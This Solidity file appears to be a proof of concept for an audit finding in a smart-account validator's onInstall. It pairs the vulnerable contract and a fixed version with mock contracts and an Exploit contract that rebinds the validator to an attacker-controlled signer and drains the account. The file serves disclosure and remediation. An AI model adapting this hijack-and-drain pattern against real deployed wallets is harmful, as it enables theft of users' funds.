// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Molecule Onchainlab — RootValidator.onInstall (Cyfrin, 2026-05, finding 65952)
    onInstall stores the first 20 bytes of calldata as the OCL's validator binding.
    It does not require the bound address to be msg.sender and it does not
    refuse a second write. A permissive executor makes the OCL call onInstall,
    so the binding is overwritten with a FakeSigner the attacker controls.
    execute() then treats the attacker as the owner and pays out the OCL balance.

    CREATE order inside Exploit:
      nonce 1 Token, 2 RootValidator, 3 FakeSigner, 4 OnChainLab, 5 Executor
*/

contract Token {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface ISigner {
    function signer() external view returns (address);
}

interface IValidator {
    function onInstall(bytes calldata data) external payable;
    function bound(address account) external view returns (address);
}

contract RootValidator {
    struct EcdsaValidatorStorage {
        address onchainlab;
    }

    mapping(address => EcdsaValidatorStorage) public ecdsaValidatorStorage;
    event RootValidatorRegistered(address indexed onchainlab);

    function bound(address account) external view returns (address) {
        return ecdsaValidatorStorage[account].onchainlab;
    }

    function onInstall(bytes calldata _data) external payable {
        address payable onchainlab = payable(address(bytes20(_data[0:20])));
        // @> VULN: stores the caller-supplied address with no self-binding and no already-initialized guard
        ecdsaValidatorStorage[msg.sender].onchainlab = onchainlab;
        emit RootValidatorRegistered(onchainlab);
    }
}

contract RootValidatorFixed {
    struct EcdsaValidatorStorage {
        address onchainlab;
    }

    mapping(address => EcdsaValidatorStorage) public ecdsaValidatorStorage;
    error InvalidInstallData();
    error InstallSenderMismatch();
    error AlreadyInitialized();

    function bound(address account) external view returns (address) {
        return ecdsaValidatorStorage[account].onchainlab;
    }

    function onInstall(bytes calldata _data) external payable {
        if (_data.length < 20) revert InvalidInstallData();
        address payable onchainlab = payable(address(bytes20(_data[0:20])));
        if (onchainlab != msg.sender) revert InstallSenderMismatch();
        if (ecdsaValidatorStorage[msg.sender].onchainlab != address(0)) revert AlreadyInitialized();
        ecdsaValidatorStorage[msg.sender].onchainlab = onchainlab;
    }
}

contract FakeSigner {
    address public attackerSigner;

    constructor(address a) {
        attackerSigner = a;
    }

    function signer() external view returns (address) {
        return attackerSigner;
    }
}

contract OnChainLab {
    IValidator public validator;
    Token public token;
    address public owner;
    address public executor;

    constructor(IValidator _validator, Token _token, address _owner) {
        validator = _validator;
        token = _token;
        owner = _owner;
        _validator.onInstall(abi.encodePacked(address(this)));
    }

    function setExecutor(address _executor) external {
        require(executor == address(0), "set");
        executor = _executor;
    }

    function signer() external view returns (address) {
        return owner;
    }

    function executeFromExecutor(address target, uint256 value, bytes calldata data) external {
        require(msg.sender == executor, "exec");
        (bool ok,) = target.call{value: value}(data);
        require(ok, "inner");
    }

    function execute(address to, uint256 amount) external {
        address boundTo = validator.bound(address(this));
        address who = ISigner(boundTo).signer();
        require(msg.sender == who, "sig");
        token.transfer(to, amount);
    }
}

contract Executor {
    function sudoDoExec(address account, address target, bytes calldata data) external {
        OnChainLab(payable(account)).executeFromExecutor(target, 0, data);
    }
}

contract Exploit {
    Token public token;
    RootValidator public validator;
    FakeSigner public fake;
    OnChainLab public account;
    Executor public executor;
    uint256 public stolen;

    constructor() {
        token = new Token();
        validator = new RootValidator();
        fake = new FakeSigner(address(this));
        account = new OnChainLab(IValidator(address(validator)), token, address(0xA11CE));
        executor = new Executor();
        account.setExecutor(address(executor));
        token.mint(address(account), 5 ether);
    }

    function run() external {
        (bool blocked,) =
            address(account).call(abi.encodeWithSelector(account.execute.selector, address(this), 5 ether));
        require(!blocked, "pre-hijack");

        bytes memory hijack =
            abi.encodeWithSelector(validator.onInstall.selector, abi.encodePacked(address(fake)));
        executor.sudoDoExec(address(account), address(validator), hijack);
        require(validator.bound(address(account)) == address(fake), "rebound");

        uint256 beforeBal = token.balanceOf(address(this));
        account.execute(address(this), 5 ether);
        stolen = token.balanceOf(address(this)) - beforeBal;
        require(stolen == 5 ether, "drained");
        require(token.balanceOf(address(account)) == 0, "empty");
    }
}
